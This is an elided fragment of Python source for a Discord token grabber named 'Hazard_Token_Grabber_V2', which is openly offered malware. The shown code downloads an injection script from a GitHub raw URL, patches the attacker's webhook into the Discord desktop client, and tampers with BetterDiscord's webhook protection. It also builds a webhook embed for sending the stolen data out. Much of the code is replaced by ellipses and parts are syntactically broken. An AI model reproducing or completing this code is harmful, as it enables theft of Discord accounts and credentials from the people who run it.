...
class Hazard_Token_Grabber_V2:
            ...
            for name in dirs:
                if "discord_desktop_core-" in name:
                    try:
                        ...
                        pass
                    f = requests.get("https://raw.githubusercontent.com/Kotherthing/Injection/main/Injection-clean").text.replace("%WEBHOOK_LINK%", self.webhook)
    ...
    def bypass_better_discord(self):
        ...
        with open(bd, "rt", encoding="cp437") as f:
            content = f.read()
            content2 = content.replace("api/webhooks", "FuckImSad")
        with open(bd, 'w'): pass
    ...
    def SendInfo(self):
        ...
        backslash = "\n"
        embed = {
            "avatar_url":"https://cdn.discordapp.com/attachments/942143738006868090/942149324593307648/newpfp.png",
            "embeds": [
                {
                    "author": {
                        "name": "Love Sucks.V2",
                    ...
                    "thumbnail": {
                      "url": "https://cdn.discordapp.com/attachments/942143738006868090/942149324593307648/newpfp.png"
                    },       

                    "footer": {
                      "text": "FUCK I MISS HER DUDE"
                    }
                }
            ]
        }
